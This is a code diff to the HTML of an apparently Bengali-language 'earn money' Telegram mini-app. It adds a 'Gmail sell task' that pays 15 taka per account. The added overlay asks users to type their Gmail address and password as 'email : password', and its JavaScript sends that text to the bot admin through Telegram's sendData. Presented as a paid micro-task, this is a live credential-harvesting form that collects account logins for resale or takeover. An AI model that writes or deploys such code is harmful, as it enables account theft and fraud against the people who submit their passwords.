@@ -281,6 +281,70 @@
                 <p style="color: #ccc; margin-bottom: 12px; font-size: 13px;">সম্পূর্ণ বিজ্ঞাপন দেখে আয় করুন</p>
                 <button class="btn btn-main" onclick="watchAdTask()">📺 বিজ্ঞাপন দেখুন</button>
             </div>
+                    <!-- জিমেইল সেল টাস্ক কার্ড শুরু -->
+        <div class="card">
+            <h3 style="color: #ffcc00; margin-bottom: 5px;">📧 জিমেইল সেল টাস্ক</h3>
+            <p style="color: #ffffff; margin-bottom: 15px; font-size: 14px;">
+                প্রতি সঠিক জিমেইল সেল করার জন্য ১৫ টাকা পাবেন।
+            </p>
+            <button class="btn btn-main" onclick="openGmailSellPage()">জিমেইল সেল করুন</button>
+        </div>
+        <!-- জিমেইল সেল টাস্ক কার্ড শেষ -->
+
+        <!-- জিমেইল সেল ওভারলে ইন্টারফেস পেজ -->
+        <div id="gmailSellOverlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #06120b; z-index: 99999; padding: 20px; box-sizing: border-box; overflow-y: auto; font-family: Arial, sans-serif;">
+            <div style="text-align: right; margin-bottom: 10px;">
+                <button onclick="closeGmailSellPage()" style="background-color: #ff3333; color: #ffffff; border: none; padding: 6px 14px; border-radius: 6px; font-weight: bold; font-size: 13px; cursor: pointer;">
+                    বন্ধ করুন ✖
+                </button>
+            </div>
+            <h2 style="color: #ffcc00; text-align: center; font-size: 22px; margin: 10px 0 5px 0;">📧 জিমেইল সাবমিট করুন</h2>
+            <p style="color: #a5b3aa; text-align: center; font-size: 13px; margin: 0 0 25px 0;">সঠিক তথ্য সাবমিট করে ভেরিফিকেশনের জন্য অপেক্ষা করুন।</p>
+            <div style="margin: 20px 0; text-align: left; padding: 0 5px;">
+                <label style="color: #ffffff; display: block; margin-bottom: 4px; font-size: 14px; font-weight: bold;">আপনার জিমেইল ও পাসওয়ার্ড লিখুন:</label>
+                <span style="color: #ffcc00; display: block; margin-bottom: 10px; font-size: 12px;">(নিয়ম: প্রথমে জিমেইল আইডি লিখে স্পেস বা কোলন দিয়ে পাসওয়ার্ড লিখুন)</span>
+                <input type="text" id="gmailInputField" placeholder="exmaple@gmail.com : Password" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #00a859; background-color: #0d1e15; color: #ffffff; font-size: 15px; box-sizing: border-box; outline: none;">
+            </div>
+            <div style="margin-top: 20px;">
+                <button onclick="handleGmailSubmit()" style="background-color: #00a859; color: #ffffff; border: none; padding: 13px 0; font-size: 16px; font-weight: bold; border-radius: 8px; width: 100%; margin-bottom: 15px; cursor: pointer;">
+                    🚀 সাবমিট করুন
+                </button>
+                <button onclick="window.open('YOUR_VIDEO_LINK', '_blank')" style="background-color: #17a2b8; color: #ffffff; border: none; padding: 11px 0; font-size: 14px; font-weight: bold; border-radius: 8px; width: 100%; margin-bottom: 25px; cursor: pointer;">
+                    🎬 কাজের ভিডিও দেখুন
+                </button>
+                <hr style="border: 0; border-top: 1px solid #1a3325; margin-bottom: 20px;">
+                <div style="text-align: center;">
+                    <button onclick="toggleWorkHistory()" style="background-color: #495057; color: #ffffff; border: none; padding: 8px 16px; font-size: 13px; font-weight: bold; border-radius: 6px; cursor: pointer;">
+                        📜 আমার সাবমিট করা জিমেইল লিস্ট
+                    </button>
+                </div>
+            </div>
+            <div id="gmailHistorySection" style="display: none; margin-top: 20px; background-color: #0d1e15; padding: 15px; border-radius: 8px; border: 1px solid #1a3325;">
+                <h4 style="color: #ffcc00; margin: 0 0 12px 0; font-size: 14px; border-bottom: 1px solid #1a3325; padding-bottom: 5px;">আপনার জিমেইল সাবমিট রিপোর্ট:</h4>
+                <ul id="gmailHistoryLog" style="color: #ffffff; list-style: none; padding: 0; font-size: 13px; margin: 0; line-height: 1.8;"></ul>
+            </div>
+        </div>
+
+        <script>
+        function openGmailSellPage() { document.getElementById('gmailSellOverlay').style.display = 'block'; }
+        function closeGmailSellPage() { document.getElementById('gmailSellOverlay').style.display = 'none'; }
+        function toggleWorkHistory() {
+            var historyPanel = document.getElementById('gmailHistorySection');
+            historyPanel.style.display = historyPanel.style.display === 'none' ? 'block' : 'none';
+        }
+        function handleGmailSubmit() {
+            var gmailData = document.getElementById('gmailInputField').value.trim();
+            if (gmailData === "") { alert("অনুগ্রহ করে ফাঁকা ঘরটি পূরণ করুন!"); return; }
+            if (!gmailData.toLowerCase().includes("@gmail.com")) { alert("Your Email Wrong, শেষে @gmail.com থাকতে হবে!"); return; }
+            
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.sendData(JSON.stringify({ action: "gmail_submit", info: gmailData }));
+                alert("অনুরোধটি এডমিনের কাছে পাঠানো হয়েছে!");
+                closeGmailSellPage();
+            } else { alert("অনুরোধটি এডমিনের কাছে পাঠানো হয়েছে! (বট টেস্ট মোড)"); }
+        }
+        </script>
+
 
             <!-- লকি স্পিন -->
             <div class="card">
